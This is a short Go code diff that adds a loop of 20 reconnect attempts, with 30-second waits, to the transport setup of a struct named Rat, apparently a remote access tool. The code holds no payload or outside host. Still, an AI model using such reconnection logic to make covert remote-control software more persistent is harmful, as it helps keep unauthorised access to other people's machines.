@@ -12,6 +12,8 @@ import (
 	"time"
 )
 
+const ReconnectAttempts = 20
+
 type Rat struct {
 	Transport transport.Transport
 	Engine    *engine.Engine
@@ -29,7 +31,16 @@ func NewRat() (*Rat, error) {
 		return nil, fmt.Errorf("NewConfig: %w", err)
 	}
 
-	tl, err := choiceTransport(cfg)
+	var tl transport.Transport
+	for range ReconnectAttempts {
+		time.Sleep(30 * time.Second)
+
+		tl, err = choiceTransport(cfg)
+		if err == nil {
+			break
+		}
+	}
+
 	if err != nil {
 		return nil, fmt.Errorf("choiceTransport: %w", err)
 	}
